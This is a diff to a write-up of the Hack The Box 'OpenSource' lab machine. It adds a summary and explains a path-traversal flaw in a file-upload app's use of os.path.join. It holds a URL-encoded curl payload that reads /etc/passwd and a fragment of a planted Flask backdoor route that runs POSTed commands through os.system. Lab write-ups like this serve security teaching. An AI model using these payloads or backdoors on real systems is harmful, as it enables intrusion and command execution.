@@ -7,6 +7,9 @@ tags: [git, LFI, RCE, Docker, Port Forwarding, Tunneling, git hooks]
 ---
 ![Opensource](/assets/img/HTB-opensource/OpenSource.png)
 
+# Summary
+This machine's theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository. Privilage escaltion revolves around a custom script ran as root to commit and push the home directory of the comprised user, that can be exploited by adding a malicious pre-commit hook.
+
 # Enumration
 
 ## Port scanning 
@@ -60,14 +63,33 @@ This function sanitizes the file name from the users post request (uploading a f
 
 We can see that it only filters `../`
 
-This can be bypassed by URL encoding the payload
+And if we check out how the path is constructed in `views.py`. We see that it just uses `os.path.join()`
+
+```python
+@app.route('/upcloud', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name) # Vulnerable line
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+```
+And that is vulnerable because, if we looked at how `os.path.join()` works
+![path vuln](/assets/img/HTB-opensource/os_path_vuln.png)
+
+We can see that if we add a `/` to any argument it will ignore all the arguments that came before and start from the argument that starts with `/`.
+
+So that means we could control the file path and bypass the LFI filter by just adding a `/` making it an absolute path.
 ```shell
-curl http://opensource.htb/uploads/..%2f..%2f..%2f..%2f..%2f..%2f%2fetc%2fpasswd
+curl http://opensource.htb/uploads/..%2f%2fetc/passwd
 ```
 ![passwd](/assets/img/HTB-opensource/etc-passwd.png)
+
 This does return `/etc/passwd` from the target machine.
 
-> Using this LFI I have tried generating the werkzueg pin code but that turned out to be a rabbit hole, because some files we needed for PIN generation were not available.
+> Using this LFI I have tried generating the werkzueg pin code but I could not get that to work.
 
 ---
 # Foothold
@@ -85,7 +107,7 @@ def shell():
     processed_cmd = os.system(cmd)
     return processed_cmd
 ```
-added this function to `views.py` which will take any data we send with as `POST` request and process it as a command and send it back.
+added this function to `views.py` which will take any data we send with as `POST` request and process it as a command and send it back. Basically making ourselves a backdoor.
 
 Now we need to upload `views.py` but uploading it normally will place it in `/uploads` and that would be useless.
 
